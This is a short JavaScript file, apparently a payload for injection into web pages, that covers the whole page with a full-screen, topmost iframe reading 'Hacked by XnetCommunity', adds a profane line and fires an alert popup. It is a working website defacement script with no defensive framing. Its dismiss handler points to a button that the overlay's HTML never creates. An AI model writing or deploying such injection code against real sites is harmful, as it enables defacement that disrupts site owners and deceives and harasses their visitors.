// script.js — iframe overlay method (public version)
(() => {
  try {
    console.log("[inject] starting iframe overlay");

    // remove any previous test iframe if exists
    const old = document.getElementById("__xnet_iframe_overlay__");
    if (old) old.remove();

    // create iframe
    const iframe = document.createElement("iframe");
    iframe.id = "__xnet_iframe_overlay__";
    iframe.setAttribute("aria-hidden", "true");
    iframe.style.position = "fixed";
    iframe.style.top = "0";
    iframe.style.left = "0";
    iframe.style.width = "100%";
    iframe.style.height = "100%";
    iframe.style.border = "0";
    iframe.style.margin = "0";
    iframe.style.padding = "0";
    iframe.style.zIndex = "2147483647";
    iframe.style.pointerEvents = "auto";
    iframe.style.background = "transparent";

    // append to body
    (document.body || document.documentElement).appendChild(iframe);

    // write content into iframe
    const doc = iframe.contentWindow.document;
    const html = `
      <!doctype html>
      <html>
      <head>
        <meta charset="utf-8" />
        <meta name="viewport" content="width=device-width,initial-scale=1" />
        <title>Hacked Demo</title>
        <style>
          html,body{height:100%;margin:0;background:#000;color:#fff;font-family:system-ui,Segoe UI,Roboto,Arial;}
.wrap{height:100%;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:12px;}
          a.hack-link{color:inherit;text-decoration:none}
          h1{font-size:3rem;margin:0;text-align:center;}
          p{margin:0;font-size:1.2rem;text-align:center;}
.btn{margin-top:14px;padding:8px 14px;border-radius:8px;background:#111;color:#fff;border:1px solid #444;cursor:pointer;}
        </style>
      </head>
      <body>
        <div class="wrap">
          <a class="hack-link" href="https://google.com" target="_blank" rel="noopener noreferrer">
            <h1>Hacked by XnetCommunity</h1>
          </a>
          <p><strong>Adell Say FuckYou</strong></p>
        </div>

        <script>
          document.getElementById('dismissBtn').addEventListener('click', () => {
            try { parent.document.getElementById('__xnet_iframe_overlay__').remove();} catch(e) {}
});

          setTimeout(() => alert("Hacked by XnetCommunity"), 200);
        </script>
      </body>
      </html>
    `;

    doc.open();
    doc.write(html);
    doc.close();

    console.log("[inject] iframe injected — should be visible overlay now");

} catch (err) {
    console.error("[inject] error while injecting iframe:", err);
}
})();
